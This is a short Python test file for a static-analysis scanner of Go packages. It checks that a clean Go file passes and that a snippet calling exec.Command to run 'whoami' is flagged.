"""Tests for GoStaticAnalysisScanner."""

from app.core.config import Settings
from app.scanners.static_analysis_go import GoStaticAnalysisScanner
from app.schemas.package import PackageInfo


def _make_scanner() -> GoStaticAnalysisScanner:
    return GoStaticAnalysisScanner(Settings())


def _make_package() -> PackageInfo:
    return PackageInfo(name="github.com/test/pkg", version="v1.0.0", registry="go")


async def test_clean_go_file(tmp_path):
    f = tmp_path / "main.go"
    f.write_text('package main\n\nimport "fmt"\n\nfunc main() {\n\tfmt.Println("hello")\n}\n')

    scanner = _make_scanner()
    result = await scanner.scan(_make_package(), [f])
    assert result.verdict == "pass"


async def test_exec_command_detected(tmp_path):
    f = tmp_path / "main.go"
    f.write_text('package main\n\nimport "os/exec"\n\nfunc run() {\n\texec.Command("sh", "-c", "whoami")\n}\n')

    scanner = _make_scanner()
    result = await scanner.scan(_make_package(), [f])
    assert result.verdict in ("warn", "fail")
    assert "exec" in result.details.lower()


